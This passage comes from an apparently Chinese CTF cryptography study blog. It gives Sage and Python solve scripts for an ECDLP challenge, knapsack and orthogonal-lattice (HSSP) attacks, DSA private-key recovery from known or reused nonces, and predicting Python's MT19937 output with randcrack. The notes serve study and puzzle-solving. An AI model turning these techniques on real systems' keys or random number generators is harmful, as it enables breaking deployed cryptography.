class="hljs-number">0</span>]^<span class="hljs-number">3</span>+G[<span class="hljs-number">1</span>]^<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)%p*inverse(G[<span class="hljs-number">0</span>]*G[<span class="hljs-number">1</span>],p)%p   <span class="hljs-comment">#d=(a * x0^3 + y0^3 + 1)modp * (x0*y0)^-1 modp </span><br>x = randint(<span class="hljs-number">1</span>, p)<br>Q = mul_THCurve(x, G)   <span class="hljs-comment">#Q=x*G</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;G = <span class="hljs-subst">&#123;G&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Q = <span class="hljs-subst">&#123;Q&#125;</span>&quot;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()  <span class="hljs-comment">#分析可知，目的就是求出x</span><br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p = 55099055368053948610276786301</span><br><span class="hljs-string">G = (19663446762962927633037926740, 35074412430915656071777015320)</span><br><span class="hljs-string">Q = (26805137673536635825884330180, 26376833112609309475951186883)</span><br><span class="hljs-string">ciphertext=b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p> exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>G = (<span class="hljs-number">19663446762962927633037926740</span>, <span class="hljs-number">35074412430915656071777015320</span>) <br>Q = (<span class="hljs-number">26805137673536635825884330180</span>, <span class="hljs-number">26376833112609309475951186883</span>)  <br>p = <span class="hljs-number">55099055368053948610276786301</span><br><br>ciphertext=<span class="hljs-string">b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span>   <span class="hljs-comment">#密文</span><br><br>Gx,Gy=G     <span class="hljs-comment">#提取G的x，y坐标</span><br>Qx,Qy=Q     <span class="hljs-comment">#提取Q的x，y坐标</span><br><br>M=matrix(GF(p),[[-Gx**<span class="hljs-number">3</span>,Gx*Gy],[-Qx**<span class="hljs-number">3</span>,Qx*Qy]]) <span class="hljs-comment">#构造2*2矩阵</span><br>y=vector(GF(p),[Gy**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>,Qy**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>])               <span class="hljs-comment">#构造向量</span><br>a,d=M.solve_right(y)                            <span class="hljs-comment">#求解线性方程组</span><br><span class="hljs-built_in">print</span>(a,d)<br>a=<span class="hljs-built_in">int</span>(a)<br>d=<span class="hljs-built_in">int</span>(d)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">a = 39081810733380615260725035189</span><br><span class="hljs-string">d = 8569490478014112404683314361</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>R.&lt;xx,yy,zz&gt; = Zmod(p)[]<br>cubic = a * xx^<span class="hljs-number">3</span> + yy^<span class="hljs-number">3</span> + zz^<span class="hljs-number">3</span> - d * xx * yy * zz<br>E = EllipticCurve_from_cubic(cubic, morphism=<span class="hljs-literal">True</span>)<br><br>GG = E(G)<br>QQ = E(Q)<br>k = QQ.log(GG)  <span class="hljs-comment">#椭圆曲线离散对数问题（ECDLP）</span><br><span class="hljs-comment">#k=discrete_log(QQ,GG,operation=&#x27;+&#x27;)</span><br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br>key=sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>aes=AES.new(key,AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(aes.decrypt(ciphertext))<br></code></pre></td></tr></table></figure><h1 id="背包密码"><a href="#背包密码" class="headerlink" title="背包密码"></a>背包密码</h1><p> <strong>参考：</strong></p><p> <a href="https://dexterjie.github.io/2024/07/29/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81/" title="背包密码">https://dexterjie.github.io/2024/07/29/背包密码/</a></p><p> <a href="https://blog.kamino.link/2022/04/03/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81%E5%AD%A6/">背包密码学 - Kamino’s Blog</a></p><p> <a href="https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">其他加密算法 | Lazzaro (lazzzaro.github.io)</a></p><p> <strong>背包问题：</strong></p><p> 已知有n个物体体积分别为${a_1,a_2,a_3,…a_n}$，要恰好装满一个容积为S的背包，抽象为数学公式就是</p> <span> $$ x_1a_1+x_2a_2+x_3a_3+...+x_na_n=S $$ </span> <p> 其中$X&#x3D;{x_1,x_2,x_3,…x_n}$ ($x_i$&#x3D;0或1)</p><p> <strong>加密过程：</strong> </p><ul><li><p>取明文，转成二进制表示$X&#x3D;{x_1,x_2,x_3,…x_n}$。</p></li><li><p>取超递增序列作为密钥${a_1,a_2,a_3,…a_n}$。</p></li><li><p>取一个大于每一个密钥的整数M作为模数。</p></li><li><p>取一个与$M$互质的整数$B$作为乘数。</p></li><li><p>生成公钥序列$A&#x3D;{A_1,A_2,A_3,…A_n}$，其中$A_i&#x3D;Ba_i\mod M$</p></li><li><p>生成密文</p></li></ul> <span> $$ S=\sum_{i=1}^nA_i*x_i $$ </span> <p> <strong>解密流程：</strong></p><ul><li><p>求乘数$B$的关于模$M$的模逆$B^{-1}$</p></li><li><p>计算密文</p></li></ul> <span> $$ S'=B^{-1}S\mod M=\sum_{i=1}^nx_ia_i \mod M $$ </span> <ul><li>利用超递增序列特性，从大到小解决背包问题。</li></ul> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(key):<br>    <span class="hljs-keyword">if</span> s &gt; i:<br>        m += <span class="hljs-string">&#x27;1&#x27;</span><br>        s -= i<br>    <span class="hljs-keyword">else</span>:<br>        m += <span class="hljs-string">&#x27;0&#x27;</span><br>        s -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p> <strong>解密攻击：（不知道乘数）</strong></p><p> 构造格：</p><span>$$ \begin{bmatrix}2 & 0 & 0 & \cdots & m_1\\0 & 2 & 0 & \cdots & m_2\\0 & 0 & 2 & \cdots & m_3\\\vdots & \vdots & \vdots & \ddots & \vdots\\1 & 1 & 1 & \cdots & S \\\end{bmatrix}$$</span> <p> 利用LLL或BKZ，栗子如下：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">sum</span>=<span class="hljs-number">492226042629702</span><br>nbits=<span class="hljs-number">32</span><br>M=[<span class="hljs-number">19620578458228</span>, <span class="hljs-number">39616682530092</span>, <span class="hljs-number">3004204909088</span>, <span class="hljs-number">6231457508054</span>, <span class="hljs-number">3702963666023</span>, <span class="hljs-number">48859283851499</span>, <span class="hljs-number">4385984544187</span>, <span class="hljs-number">11027662187202</span>, <span class="hljs-number">18637179189873</span>, <span class="hljs-number">29985033726663</span>, <span class="hljs-number">20689315151593</span>, <span class="hljs-number">20060155940897</span>, <span class="hljs-number">46908062454518</span>, <span class="hljs-number">8848251127828</span>, <span class="hljs-number">28637097081675</span>, <span class="hljs-number">35930247189963</span>, <span class="hljs-number">20695167327567</span>, <span class="hljs-number">36659598017280</span>, <span class="hljs-number">10923228050453</span>, <span class="hljs-number">29810039803392</span>, <span class="hljs-number">4443991557077</span>, <span class="hljs-number">31801732862419</span>, <span class="hljs-number">23368424737916</span>, <span class="hljs-number">15178683835989</span>, <span class="hljs-number">34641771567914</span>, <span class="hljs-number">44824471397533</span>, <span class="hljs-number">31243260877608</span>, <span class="hljs-number">27158599500744</span>, <span class="hljs-number">2219939459559</span>, <span class="hljs-number">20255089091807</span>, <span class="hljs-number">24667494760808</span>, <span class="hljs-number">46915118179747</span>]<br>A=Matrix(ZZ,nbits+<span class="hljs-number">1</span>,nbits+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits):<br>    A[i,i]=<span class="hljs-number">2</span><br>    A[i,-<span class="hljs-number">1</span>]=M[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits+<span class="hljs-number">1</span>):<br>    A[-<span class="hljs-number">1</span>,i]=<span class="hljs-number">1</span><br>A[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=<span class="hljs-built_in">sum</span><br>r=A.LLL()<br><span class="hljs-built_in">print</span>(r[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#(-1, -1, 1, -1, 1, -1, -1, -1, -1, 1, 1, -1, -1, -1, -1, 1, -1, -1, -1, 1, -1, -1, -1, -1, 1, -1, -1, 1, 1, -1, 1, 1, 0)</span><br></code></pre></td></tr></table></figure><h1 id="正交格"><a href="#正交格" class="headerlink" title="正交格"></a>正交格</h1><p> <strong>参考：</strong></p><p> <a href="https://0xffff.one/d/2077">HSSP与正交格学习笔记 - 0xFFFF</a></p><p> <a href="https://huangx607087.online/2025/02/21/Hgame25/#6-SPiCa-8pts-21sol">Hgame25 - huangx607087’s Blog</a></p><p> <strong>HSSP问题：</strong></p><p> $A\vec{x}\equiv\vec{b}\mod p$，已知$\vec{b}$和$p$，而$A$（0,1矩阵）和$\vec{x}$（向量）未知。</p><p> <strong>四大基本子空间：</strong></p><ul><li><p><strong>行空间：</strong> $A\vec{x}&#x3D;\vec{b}$中，所有$\vec{b}$构成的空间，此时$A$的每一行构成空间的基底向量。</p></li><li><p><strong>列空间：</strong> $A\vec{x}&#x3D;\vec{b}$中，所有$\vec{b}$构成的空间，此时$A$的每一列构成空间的基底向量。</p></li><li><p><strong>左0空间：</strong> 满足$\vec{x}A&#x3D;\vec{0}$的所有$\vec{x}$构成的集合，在sagemath中为 <code>A.left_kernel().matrix()</code>。其个数为$m-r+1$，$r$为$A$中互相线性无关的行向量个数。</p></li><li><p><strong>右0空间：</strong> 满足$\vec{x}A&#x3D;\vec{0}$的所有$\vec{x}$构成的集合，在sagemath中为 <code>A.right_kernel().matrix()</code>。其个数为$n-r+1$，$r$为$A$中互相线性无关的列向量个数。</p></li></ul><blockquote><p><strong>性质：</strong> <strong>行空间</strong>和<strong>右0空间</strong>正交，<strong>列空间</strong>和<strong>左0空间</strong>正交。</p></blockquote><p> <strong>问题解法：</strong></p><ul><li><p>对已知给定的向量$\vec{h} \mod M$，首先找与$\vec{h}$垂直的$m-n$个短向量$\vec{\mu_i}$</p></li><li><p>使用$\mu_i$构造格$L_{\frac{1}{x}}$，用$L_{\frac{1}{x}}$找到$L_x$的正交补$\overline{L_x}$</p></li><li><p>对$\overline{L_x}$使用BKZ恢复$x_i$</p></li></ul><p> <strong>参考代码：</strong></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#正交格</span><br><span class="hljs-keyword">import</span> logging<br>logging.basicConfig(<br>    level=logging.DEBUG,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&quot;[%(levelname)s] %(message)s&quot;</span><br>)<br><br><span class="hljs-comment"># https://github.com/Neobeo/HackTM2023/blob/main/solve420.sage</span><br><span class="hljs-comment"># faster LLL reduction to replace `M.LLL()` wiith `flatter(M)`</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flatter</span>(<span class="hljs-params">M, **kwds</span>):<br>    <span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> check_output<br>    <span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> findall<br>    M = matrix(ZZ,M)<br>    <span class="hljs-comment"># compile https://github.com/keeganryan/flatter and put it in [imath:0]PATH</span><br>    z = <span class="hljs-string">&#x27;[[&#x27;</span> + <span class="hljs-string">&#x27;]\n[&#x27;</span>.join(<span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,row)) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> M) + <span class="hljs-string">&#x27;]]&#x27;</span><br>    ret = check_output([<span class="hljs-string">&quot;flatter&quot;</span>], <span class="hljs-built_in">input</span>=z.encode())<br>    <span class="hljs-keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,findall(<span class="hljs-string">b&#x27;-?\\d+&#x27;</span>, ret)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkMatrix</span>(<span class="hljs-params">M, wl=[-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]</span>):<br>    M = [<span class="hljs-built_in">list</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(M)]<br>    ml = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(flatten(M)))<br>    logging.debug(ml)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(ml) == <span class="hljs-built_in">sorted</span>(wl)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Nguyen_Stern</span>(<span class="hljs-params">h, m, n, M</span>):<br>    B = matrix(ZZ, m)<br>    B[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] = M<br>    h0i = Integer(h[<span class="hljs-number">0</span>]).inverse_mod(M)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>        B[i, <span class="hljs-number">0</span>] = - h[i] * h0i<br>        B[i, i] = <span class="hljs-number">1</span><br>    <span class="hljs-comment">#L = B.BKZ()    # slooooooow</span><br>    L = flatter(B)<br>    logging.info(<span class="hljs-string">&#x27;flatter done.&#x27;</span>)<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    vh = vector(Zmod(M), h)</span><br><span class="hljs-string">    logging.debug([vector(Zmod(M), list(l)) * vh  for l in L])</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    Lxo = matrix(ZZ, L[:m-n])<br>    Lxc = Lxo.right_kernel(algorithm=<span class="hljs-string">&#x27;pari&#x27;</span>).matrix() <span class="hljs-comment"># faster</span><br>    logging.info(<span class="hljs-string">&#x27;right_kernel done.&#x27;</span>)<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        Lx_real = matrix(ZZ, [xi + [0] * (m - len(xi)) for xi in X])</span><br><span class="hljs-string">        rsc = Lxc.row_space()</span><br><span class="hljs-string">        logging.debug([xi in rsc for xi in Lx_real])</span><br><span class="hljs-string">    except:</span><br><span class="hljs-string">        pass</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    e = matrix(ZZ, [<span class="hljs-number">1</span>] * m)<br>    B = block_matrix([[-e], [<span class="hljs-number">2</span>*Lxc]])<br>    Lx = B.BKZ()<br>    logging.info(<span class="hljs-string">&#x27;BKZ done.&#x27;</span>)<br>    <span class="hljs-keyword">assert</span> checkMatrix(Lx)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(Lx[<span class="hljs-number">0</span>])) == <span class="hljs-number">1</span><br><br>    Lx = Lx[<span class="hljs-number">1</span>:]<br>    E = matrix(ZZ, [[<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.ncols())] <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.nrows())])<br>    Lx = (Lx + E) / <span class="hljs-number">2</span><br><br>    Lx2 = []<br>    e = vector(ZZ, [<span class="hljs-number">1</span>] * m)<br>    rsc = Lxc.row_space()<br>    <span class="hljs-keyword">for</span> lx <span class="hljs-keyword">in</span> Lx:<br>        <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>            Lx2 += [lx]<br>            <span class="hljs-keyword">continue</span><br>        lx = e - lx<br>        <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>            Lx2 += [lx]<br>            <span class="hljs-keyword">continue</span><br>        logging.warning(<span class="hljs-string">&#x27;Something wrong?&#x27;</span>)<br>    Lx = matrix(Zmod(M), Lx2)<br><br>    vh = vector(Zmod(M), h)<br>    va = Lx.solve_left(vh)<br>    <span class="hljs-keyword">return</span> Lx, va<br><br>m = <span class="hljs-number">200</span><span class="hljs-comment">#x是n个m维向量组成</span><br>n = <span class="hljs-number">100</span><span class="hljs-comment">#n是x_i和a_i的个数</span><br>M =    <span class="hljs-comment">#模数</span><br>h =    <span class="hljs-comment">#给定的最终向量h</span><br><br>Lx, va = Nguyen_Stern(h, m, n, M)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;向量a:&quot;</span>,va)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;矩阵x:&quot;</span>,Lx)<br></code></pre></td></tr></table></figure><p> （代码这里先偷了，后续会自己实现的qwq）</p><blockquote><p><strong>附上Arch Linux安装flatter步骤：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> pacman -S gmp mpfr eigen base-devel gcc git cmake<br>git <span class="hljs-built_in">clone</span> https://github.com/keeganryan/flatter.git<br><span class="hljs-built_in">cd</span> flatter<br><span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> ./build<br>cmake -DCMAKE_INSTALL_PREFIX=/usr ..<br>make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure></blockquote><h2 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h2><h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><ul><li><p>选择一个哈希函数（通常为SHA1）</p></li><li><p>选择密钥长度<strong>L</strong>和<strong>N</strong></p></li><li><p>选择N比特的素数q</p></li><li><p>选择L比特的素数p，使p-1是q的倍数</p></li><li><p>选择g，使满足$g^k\equiv 1\ mod p$ 的最小正整数k为q。可用$g&#x3D;h^{\frac {p-1}{q}}$来获得g，其中1 &lt; h &lt;p-1</p></li><li><p>选择私钥x，0 &lt; x &lt; q,计算$y\equiv g^x \mod p$</p></li></ul><blockquote><p>公钥为 <strong>（p，q，g，y）</strong> ，私钥为 <strong>（x）</strong> </p></blockquote><h3 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h3><ul><li><p>选择随机整数k作为临时密钥，0&lt;k&lt; q</p></li><li><p>计算$r\equiv(g^k \mod p)\mod q$</p></li><li><p>计算$s\equiv(H(m)+xr)k^{-1}\mod q$</p></li></ul><blockquote><p>签名结果为 <strong>（r，s）</strong> ，与Elgamal 不同，这里使用了哈希函数对消息进行了哈希处理。</p></blockquote><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><ul><li><p>计算辅助值$w&#x3D;s^{-1}\mod q$</p></li><li><p>计算辅助值$u_1&#x3D;H(m)w\mod q$</p></li><li><p>计算辅助值$u_2&#x3D;rw\mod q$</p></li><li><p>计算$v&#x3D;(g^{u_1}y^{u_2}\mod p)\mod q$</p></li><li><p>检验$v$和$r$是否相等。</p></li></ul><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="1-已知k"><a href="#1-已知k" class="headerlink" title="1.已知k"></a>1.已知k</h4><ul><li><p>利用$s\equiv(H(m)+xr)k^{-1}\mod q$</p></li><li><p>可以计算$x\equiv(ks-H(m))r^{-1}\mod q$</p></li></ul><h4 id="2-k共享"><a href="#2-k共享" class="headerlink" title="2.k共享"></a>2.k共享</h4><ul><li>已知两次签名用了相同的k，即</li></ul> <span>   $$s_1\equiv(H(m_1)+xr)k^{-1}\mod q  \\s_2\equiv(H(m_2)+xr)k^{-1}\mod q   $$   </span> <ul><li>两式相减，得</li></ul><span>$$k(s_1-s_2)\equiv H(m_1)-H(m_2)\mod q \\k\equiv (H(m_1)-H(m_2))(s_1-s_2)^{-1}\mod q$$</span>   <p>得到k后，同上解出x。</p><h1 id="bytes-to-long函数探究"><a href="#bytes-to-long函数探究" class="headerlink" title="bytes_to_long函数探究"></a>bytes_to_long函数探究</h1><p> <strong>用途：</strong> 将字节序列转换成长整数。</p><p> <strong>转换过程：</strong> 每个字节被解释为一个<strong>8位</strong>无符号整数，从最低位到最高位逐字节累加，每向左移动一位，数值乘以$2^8(即256)$。</p><p> （其实应该等价于把字节转换成8位二进制拼接，然后转换成十进制）</p><p> <strong>示例：</strong><code>b&#39;\x01\x02\x03</code>转换过程如下</p> <span> $$ 0x01 \times 256^2 + 0x02\times 256^1+0x03\times 256^0 $$ </span> <h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><p><strong>概念：</strong> 以最小单位<strong>比特</strong>作为一次加密、解密的操作元素。目前都是对称加密。</p><p> <strong>特点：</strong></p><ul><li><p>流密码的密钥派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。</p></li><li><p>流密码的密钥长度会与明文长度相同。</p></li></ul><p> <strong>关键：</strong> 在于设计好的<strong>伪随机数生成器</strong>，其基本构造模块为反馈移位寄存器(FSR)。</p><h1 id="伪随机数生成器-PRNG"><a href="#伪随机数生成器-PRNG" class="headerlink" title="伪随机数生成器(PRNG)"></a>伪随机数生成器(PRNG)</h1><p> <strong>别称：</strong> 确定性随机位生成器（DRBG）</p><p> <strong>用途：</strong> 用来生成接近绝对随机数序列的数字序列的算法。</p><p> <strong>主要类型：</strong></p><ul><li><p>线性同余生成器（LCG）</p><blockquote><p>见博客文章《Crypto基础篇-LCG》</p></blockquote></li><li><p>线性回归发生器</p></li><li><p>Mersenne Twister</p></li><li><p>xorshift generators</p></li><li><p>WELL family of generators</p></li><li><p>线性反馈移位寄存器（LFSR）</p></li></ul><h1 id="LFSR线性反馈移位寄存器"><a href="#LFSR线性反馈移位寄存器" class="headerlink" title="LFSR线性反馈移位寄存器"></a>LFSR线性反馈移位寄存器</h1><p> <strong>用途：</strong> 用于产生<strong>伪随机数</strong>。</p><p> <strong>概念：</strong> LFSR是反馈寄存器中的一种，另一种为NFSR（非线性反馈寄存器）。</p><p> <strong>结构：</strong></p><p><img src="/2025/02/28/Crypto%E9%9A%8F%E7%AC%94%E6%89%AB%E7%9B%B2/file-20250402175359931.png"></p><blockquote><p>ps：若反馈函数是线性的，则其成为<strong>线性反馈移位寄存器</strong>（LFSR）</p></blockquote><p> <strong>过程表示：</strong><br><img src="/2025/02/28/Crypto%E9%9A%8F%E7%AC%94%E6%89%AB%E7%9B%B2/file-20250402175431141.png"></p><h1 id="Python中的random函数（MT19937）"><a href="#Python中的random函数（MT19937）" class="headerlink" title="Python中的random函数（MT19937）"></a>Python中的random函数（MT19937）</h1><p><strong>介绍：</strong> python内置的random方法使用的是<strong>梅森旋转算法MT19937</strong>，最长周期为一个梅森素数$2^{19937} -1$ 。并且在Python中是基于32位的<strong>MT19937-32</strong>.<br><strong>攻击方法：</strong><br>使用<strong>randcrack库</strong>进行预测，使用方法也非常简单，<br>只需将前624个32bit的random生成的随机数提交给randcrack，便可以预测之后的随机数。<br><strong>代码实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><br>rc = RandCrack()<br>arr=[] <span class="hljs-comment">#已知的624个32bit随机数</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:<br>rc.submit(i)<br><br>rand_next = rc.predict_getrandbits(<span class="hljs-number">10000</span>) <span class="hljs-comment">#改成自己所需要的位数</span><br><span class="hljs-built_in">print</span>(rand_next)<br></code></pre></td></tr></table></figure><p><strong>特殊情况：</strong> 如果只有312个64bit的random数呢？<br>首先，我们要理解random库生成随机数的本质，<br>形象的来说，每个随机数都是从一个长bit数的低位<strong>切割</strong>下来得到的。<br>举个例子，如果种子数相同，<br>第一个序列生成一个64bit数，<br>第二个序列生成两个32bit数，<br>结果会怎样呢，事实便是两个32bit数按照先生成的在低位，后生成的在高位拼接，就会得到这个64bit数。<br><strong>总结：</strong> 即使只有312个64bit数，将其拆分成624个32bit数之后，仍然能够进行预测，其他长度也同理，只要长度总和达到624×32就可以预测。</p><h1 id="简单的OTP（一次一密）"><a href="#简单的OTP（一次一密）" class="headerlink" title="简单的OTP（一次一密）"></a>简单的OTP（一次一密）</h1><p><strong>介绍：</strong> 明文、密钥、密文长度均相同<br><strong>分析：</strong> 已知明文、密文，可通过异或获得密钥，如果密钥复用，便可以进行攻击。</p><h1 id="扩展中国剩余定理（exCRT）"><a href="#扩展中国剩余定理（exCRT）" class="headerlink" title="扩展中国剩余定理（exCRT）"></a>扩展中国剩余定理（exCRT）</h1><p><strong>简介：</strong> 解决CRT模数不互素的情况<br><strong>脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 